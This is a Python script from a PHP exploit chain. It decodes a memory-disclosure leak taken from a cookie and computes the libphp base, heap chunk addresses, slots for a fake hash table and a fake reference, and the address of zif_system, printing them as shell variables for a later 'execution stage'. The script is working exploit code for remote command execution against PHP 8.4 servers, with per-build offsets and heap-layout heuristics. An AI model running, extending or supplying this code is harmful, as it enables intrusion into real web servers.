#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""leak_addrs.py - turn a disclosure cookie into the addresses the execution stage needs.

The leak is only useful if it yields a complete address set, so this is deliberately a separate step
from decoding: it applies the two relations we measured (main chunk = disclosed chunk + 0x400000, and
each symbol offset inside libphp) and prints them either for a human or as shell assignments for the
driving script.

usage:
  leak_addrs.py --cookie-file /tmp/ck.txt                 # human readable
  eval "$(leak_addrs.py --cookie-file /tmp/ck.txt --emit shell)"
"""
import argparse
import sys
from collections import Counter

from decode_leak_cookie import (MAX_PTR, MIN_PTR, SYMBOL_PROFILES, DEFAULT_SYMBOLS, detect_arch,
                                load_cookie, profile_key, slide_pointers, summarise, to_bytes)

MAIN_DELTA = 0x400000   # measured: main chunk sits 4 MiB above the chunk the stale id lives in
S_OFF = 0xF8398         # fake zend_array slot inside the main chunk (reference layout)
HSV_OFF = 0x7D720       # the zval slot the fake reference must overwrite (reference layout)


def parse_symbols(items, profile):
    symbols = {k: v for k, v in profile.items() if not k.endswith("_off")}
    for item in items:
        name, _, offset = item.partition("=")
        symbols[name.strip()] = int(offset.strip(), 0)
    return symbols


def resolve_symbols(args, blob):
    """Pick the offset table and heap layout: explicit --symbol wins, then the profile.

    Without a symbol table the fingerprint step cannot find libphp at all, and with the wrong one it
    finds a plausible base that is tens of MB off - the failure then shows up as B2 missing, not as a
    symbol problem. The two heap slots are build-specific for the same reason.
    """
    arch = args.arch
    inferred = False
    if arch == "auto":
        arch, inferred = detect_arch(blob), True
        if not arch:
            return None, None, None, "arch not detectable from the leak; pass --arch arm64|x86_64"
    name = profile_key(arch, args.php_version, args.distro)
    profile = SYMBOL_PROFILES.get(name)
    if args.symbol:
        base = profile or DEFAULT_SYMBOLS
        layout = (base.get("s_off", S_OFF), base.get("hsv_off", HSV_OFF), base.get("spray_first", 8),
                  base.get("n1", 500), base.get("vl", 384), base.get("sid_field", 1),
                  base.get("fillers", 115))
        return parse_symbols(args.symbol, base), name, layout, None
    if profile is None:
        return None, None, None, ("no symbol profile for %s; pass --symbol zval_ptr_dtor=0x...,"
                                  "zif_system=0x...,zend_hash_destroy=0x... (or --arch/--php-version/"
                                  "--distro)" % name)
    if inferred:
        print("arch: %s (inferred from the leak; --arch overrides)" % arch, file=sys.stderr)
    return (parse_symbols([], profile), name,
            (profile["s_off"], profile["hsv_off"], profile.get("spray_first", 8),
             profile.get("n1", 500), profile.get("vl", 384), profile.get("sid_field", 1),
             profile.get("fillers", 115)), None)


def main(argv=None):
    ap = argparse.ArgumentParser(description="address set for the execution stage")
    source = ap.add_mutually_exclusive_group(required=True)
    source.add_argument("--value")
    source.add_argument("--cookie-file")
    source.add_argument("--dump")
    ap.add_argument("--symbol", action="append", default=[],
                    help="name=offset inside libphp, e.g. zif_system=0x42cd70")
    ap.add_argument("--arch", choices=["auto", "arm64", "x86_64"], default="auto",
                    help="target architecture; auto reads it out of the leak")
    ap.add_argument("--php-version", default="8.4.26",
                    help="selects the offset profile; 8.4.26 (official image) unless the probe says "
                         "otherwise")
    ap.add_argument("--distro", default="",
                    help="distribution tag from probe.php, e.g. debian13; selects the package profile")
    ap.add_argument("--main-delta", type=lambda x: int(x, 0), default=None,
                    help="chunk bytes between the disclosed chunk and the main chunk; default is to "
                         "read the second chunk cluster out of the leak, which is what x86-64 needs")
    ap.add_argument("--s-off", type=lambda x: int(x, 0), default=None,
                    help="fake-array slot inside the main chunk; default from the profile")
    ap.add_argument("--hsv-off", type=lambda x: int(x, 0), default=None,
                    help="stale-zval slot inside the main chunk; default from the profile")
    ap.add_argument("--min-cluster", type=int, default=16,
                    help="pointers a fingerprint cluster needs before it counts as a load base")
    ap.add_argument("--emit", choices=["text", "shell"], default="text")
    args = ap.parse_args(argv)

    blob = to_bytes(load_cookie(args))
    symbols, profile, layout, error = resolve_symbols(args, blob)
    if error:
        print(error, file=sys.stderr)
        return 1
    if args.s_off is not None:
        layout = (args.s_off, layout[1], layout[2], layout[3])
    if args.hsv_off is not None:
        layout = (layout[0], args.hsv_off, layout[2], layout[3])
    args.s_off, args.hsv_off, spray_first, n1, vl, sid_field, fillers = layout
    result = summarise(blob, symbols)

    libphp = result["libphp_base"]
    if not libphp or result["libphp_weight"] < args.min_cluster:
        print("incomplete: no libphp base (%d pointers in the best cluster)"
              % result["libphp_weight"], file=sys.stderr)
        return 1
    disclosed = result["chunk_base"]
    if not disclosed:
        print("incomplete: no chunk cluster", file=sys.stderr)
        return 1

    # Which chunk is "main"? On arm64 it sat 4 MiB above the disclosed chunk and that held 3/3, so a
    # constant was good enough. On x86-64 the distance came back as 0x200000, 0x600000 and 0x800000 in
    # three fresh containers, and a fixed delta scored 1/3. The window always carries a second cluster of
    # chunk pointers - 454 of them - and that cluster *is* the main chunk, so it is read out of the leak
    # instead of being assumed. The 454 figure is itself stable: it appeared with 0x400000 on arm64 and
    # with every x86-64 distance measured.
    main_chunk = disclosed + args.main_delta if args.main_delta is not None else 0
    main_source = ("= disclosed + %#x (fixed delta)" % args.main_delta
                   if args.main_delta is not None else "")
    if not main_chunk:
        # `other_bases` cannot be used here: slide_pointers() steps one byte at a time, so each real
        # pointer contributes eight overlapping windows and the list fills with bases like 0x0 and
        # 0x100000000. Chunk clusters have to be counted on aligned qwords.
        aligned = [int.from_bytes(blob[i:i + 8], "little") for i in range(0, len(blob) - 7, 8)]
        aligned = [q for q in aligned if MIN_PTR <= q < MAX_PTR]
        clusters = Counter(q & ~0x1FFFFF for q in aligned)
        libphp_chunk = libphp & ~0x1FFFFF
        candidates = []
        for base, count in clusters.items():
            if base == disclosed:
                continue
            # A neighbouring chunk of this heap is 2 MiB aligned. How far it sits is a property of the
            # build: +4 MiB on the arm64 image, but 206..210 MiB on the Debian 13 package, where a
            # 16 MiB window picked a small unrelated chunk and every B2 missed. The window is therefore
            # wide (256 MiB) and the choice is made by pointer count, which is what separates the main
            # chunk (hundreds of pointers) from the incidental ones (tens). Two things are excluded
            # besides: bases below 4 GiB (pointer-shaped integers, not mappings) and the module's own
            # mappings, whose data chunk carries as many pointers as the main chunk does. Those sit at
            # and above the module base - on arm64 Debian the heap chunk lies 2 MiB *below* it, so the
            # exclusion has to be one-sided or it throws the main chunk away.
            if base & 0x1FFFFF or base < 0x1_0000_0000 or abs(base - disclosed) > (256 << 20):
                continue
            if 0 <= base - libphp_chunk <= (8 << 20):
                continue
            candidates.append((count, base))
        if not candidates:
            print("incomplete: no second chunk cluster; pass --main-delta explicitly", file=sys.stderr)
            return 1
        count, main_chunk = max(candidates)
        main_source = "= second chunk cluster in the leak (%d pointers, %+#x from disclosed)" % (
            count, main_chunk - disclosed)

    values = {
        "LIBPHP": libphp,
        "CHUNK": disclosed,
        "MAIN": main_chunk,
        "S": main_chunk + args.s_off,
        "HSV": main_chunk + args.hsv_off,
        "SPRAY_FIRST": spray_first,
        "N1": n1,
        "VL": vl,
        "SID_FIELD": sid_field,
        "FILLERS": fillers,
    }
    for name in ("zif_system", "zend_hash_destroy", "zval_ptr_dtor"):
        if name in symbols:
            values[name.upper()] = libphp + symbols[name]

    if args.emit == "shell":
        for name, value in values.items():
            plain = name in ("SID_FIELD", "FILLERS")
            print("%s=%s" % (name, value if plain else "%#x" % value))
        return 0

    print("decoded       : %d bytes, %d pointer windows" % (result["decoded_bytes"], result["pointer_windows"]))
    print("symbols       : %s" % profile)
    print("disclosed     : %#x   (%d pointers, %d%% of the window)"
          % (disclosed, result["chunk_base_votes"], round(100 * result["chunk_base_share"])))
    print("libphp        : %#x   (%d pointers in the fingerprint cluster)"
          % (libphp, result["libphp_weight"]))
    print("main chunk    : %#x   (%s)" % (main_chunk, main_source))
    print("S  (fake ht)  : %#x   (main + %#x)" % (values["S"], args.s_off))
    print("hsv (fake ref): %#x   (main + %#x)" % (values["HSV"], args.hsv_off))
    for name in ("ZIF_SYSTEM", "ZEND_HASH_DESTROY"):
        if name in values:
            print("%-13s : %#x" % (name.lower().replace("_", " "), values[name]))
    return 0


if __name__ == "__main__":
    sys.exit(main())
